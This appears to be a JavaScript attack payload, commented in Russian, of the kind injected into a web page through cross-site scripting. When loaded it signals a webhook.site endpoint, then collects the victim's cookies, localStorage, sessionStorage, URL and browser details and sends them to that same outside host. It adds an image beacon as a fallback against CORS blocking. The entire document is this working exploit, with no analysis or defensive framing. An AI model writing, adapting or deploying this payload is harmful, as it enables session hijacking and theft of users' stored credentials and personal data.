// Отправляем сигнал, что скрипт запустился
fetch('https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?status=loaded&time=' + Date.now());

// Собираем базовую информацию о системе жертвы
let info = {
    url: window.location.href,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
};

// Отправляем собранные данные
fetch('https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?data=' + encodeURIComponent(JSON.stringify(info)));

// Для надёжности дублируем через Image (если fetch заблокирован CORS)
new Image().src = 'https://webhook.site/7c5dd165-5305-44ad-bf69-9dec79c2d646?image_ping=' + Date.now();

// Если нужна проверка на ошибки
console.log('Payload executed successfully');
